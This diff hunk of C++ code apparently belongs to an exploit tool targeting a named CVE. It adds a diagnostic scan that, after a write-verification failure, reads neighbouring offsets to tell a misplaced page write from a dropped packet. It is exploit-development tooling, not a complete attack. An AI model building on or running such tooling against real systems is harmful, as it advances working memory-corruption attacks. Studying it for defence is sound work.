@@ -283,6 +283,20 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                     /* 首个不符块是哪一块、试了几次 —— 与同一跑的 block[…] landed 行对齐即可判明是写没到还是读不到。 */
             GL_LOGI("verify failed: block_at=%zu offset=%llu tries=%zu", at,
                     static_cast<unsigned long long>(request.offset + at), tries);
+            /*
+             * 判定分叉：写报成功而目标偏移不变时，扫邻近偏移。
+             * 别处变了 ⇒ 落错页（页由 SA/seq 决定）；哪都没变 ⇒ 报文被丢（ICV/口径）。
+             */
+            for (const std::uint64_t scan_at : {0ULL, 16ULL, 32ULL, 4096ULL, 8192ULL, 16384ULL}) {
+                request.params->offset = request.offset + scan_at;
+                request.params->offset_set = true;
+                const auto scan = request.access->read(0U, request.width, request.channel, *request.params);
+                const bool ok = scan.ok() && scan.value.size() >= 2U;
+                GL_LOGI("verify scan: off=%llu head=%02x%02x",
+                        static_cast<unsigned long long>(request.offset + scan_at),
+                        ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[0])) : 0U,
+                        ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[1])) : 0U);
+            }
             *refusal = kVerifyFailed;  /* budget-exhausted：预算用尽仍不中 */
                     GL_LOGI("block[%zu]: budget exhausted after %zu tries", at, tries);
                     return false;
